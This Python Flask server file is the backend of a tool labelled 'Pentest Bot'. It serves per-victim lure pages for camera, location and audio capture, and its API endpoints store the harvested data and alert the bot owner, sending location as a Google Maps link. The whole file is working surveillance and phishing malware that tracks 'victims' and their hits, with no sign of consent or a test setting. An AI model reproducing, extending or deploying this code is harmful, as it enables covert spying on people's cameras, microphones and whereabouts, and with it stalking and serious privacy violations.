from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import os, json, threading, sys
from config import BASE_URL, PORT
from database import db

app = Flask(__name__)
CORS(app)
bot_started = False

def start_bot():
    global bot_started
    if bot_started: return
    try:
        from bot import run
        t = threading.Thread(target=run, daemon=True)
        t.start()
        bot_started = True
        print('Bot thread started successfully!', flush=True)
    except Exception as e:
        print(f'Bot error: {e}', flush=True)

# 🔥 ইম্পোর্টের সময়ই Bot start হবে
print("Initializing server...", flush=True)
start_bot()
print(f"Bot started: {bot_started}", flush=True)

@app.route('/')
def index():
    s = db.get_stats()
    return f'<html><body style="background:#0d1117;color:#c9d1d9;text-align:center;padding:100px 20px"><h1 style="color:#58a6ff">Pentest Bot</h1><p style="color:#3fb950">Running</p><p>Users: {s["users"]} | Victims: {s["victims"]}</p><p>Bot: {"Active" if bot_started else "Inactive"}</p></body></html>'

@app.route('/camera/<code>')
def page_cam(code):
    v = db.get_victim(code)
    return render_template('camera.html', code=code, server=BASE_URL, valid=v is not None)

@app.route('/location/<code>')
def page_loc(code):
    v = db.get_victim(code)
    return render_template('location.html', code=code, server=BASE_URL, valid=v is not None)

@app.route('/audio/<code>')
def page_aud(code):
    v = db.get_victim(code)
    return render_template('audio.html', code=code, server=BASE_URL, valid=v is not None)

@app.route('/api/camera/<code>', methods=['POST'])
def api_cam(code):
    try:
        d = request.get_json(force=True, silent=True)
        if not d: return jsonify({'status':'error'}), 400
        db.update_victim_data(code, 'camera', d)
        o = db.get_victim_owner(code)
        if o:
            try:
                from bot import bot
                bot.send_message(o, f'Camera data!\nCode: {code}')
            except: pass
        return jsonify({'status':'ok'})
    except: return jsonify({'status':'error'}), 500

@app.route('/api/location/<code>', methods=['POST'])
def api_loc(code):
    try:
        d = request.get_json(force=True, silent=True)
        if not d: return jsonify({'status':'error'}), 400
        db.update_victim_data(code, 'location', d)
        o = db.get_victim_owner(code)
        if o:
            try:
                from bot import bot
                lat = d.get('lat','?'); lng = d.get('lng','?')
                bot.send_message(o, f'Location!\n{lat},{lng}\nMap: https://www.google.com/maps?q={lat},{lng}')
            except: pass
        return jsonify({'status':'ok'})
    except: return jsonify({'status':'error'}), 500

@app.route('/api/audio/<code>', methods=['POST'])
def api_aud(code):
    try:
        d = request.get_json(force=True, silent=True)
        if not d: return jsonify({'status':'error'}), 400
        db.update_victim_data(code, 'audio', d)
        o = db.get_victim_owner(code)
        if o:
            try:
                from bot import bot
                bot.send_message(o, f'Audio data!\nCode: {code}')
            except: pass
        return jsonify({'status':'ok'})
    except: return jsonify({'status':'error'}), 500

@app.route('/api/check/<code>')
def api_check(code):
    v = db.get_victim(code)
    if not v: return jsonify({'exists':False}), 404
    return jsonify({'exists':True,'camera':bool(v['camera_data']),'location':bool(v['location_data']),'audio':bool(v['audio_data']),'hits':v['access_count']})
